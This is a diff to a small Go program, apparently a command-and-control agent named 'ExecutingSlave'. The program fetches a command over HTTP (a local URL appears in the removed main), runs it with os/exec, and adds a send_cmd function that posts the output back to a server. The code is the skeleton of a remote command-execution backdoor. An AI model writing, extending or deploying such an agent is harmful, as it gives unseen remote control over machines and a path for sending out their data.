@@ -1,4 +1,4 @@
-package main
+package ExecutingSlave
 
 import (
 	"bytes"
@@ -7,6 +7,7 @@ import (
 	"io/ioutil"
 	"net/http"
 	"os/exec"
+  "strings"
 )
 
 type Request struct {
@@ -19,7 +20,7 @@ func exec_cmd(cmd *exec.Cmd) ([]byte){
 	var out bytes.Buffer
 	cmd.Stdout = &out
 	if err := cmd.Run(); err != nil {
-		fmt.Println(err)
+		panic(err)
 	}
 	retorno:=out.Bytes()
 	return retorno
@@ -41,10 +42,12 @@ func recv_cmd(url string) (*exec.Cmd ){
 
 	return cmd
 }
-//sendCmd TODO
-func main() {
-	cmd := recv_cmd("http://127.0.0.1:5000/command")
-	result:=exec_cmd(cmd)
-	fmt.Println(string(result))
-	//cmd := exec.Command(data.Command, data.Args)
+
+func send_cmd(url string,result []byte) (){
+  r := strings.NewReader(string(result))
+  resp,err := http.Post(url,"text",r)
+  if err != nil{
+    panic(err)
+  }
+  fmt.Println(resp.Status)
 }
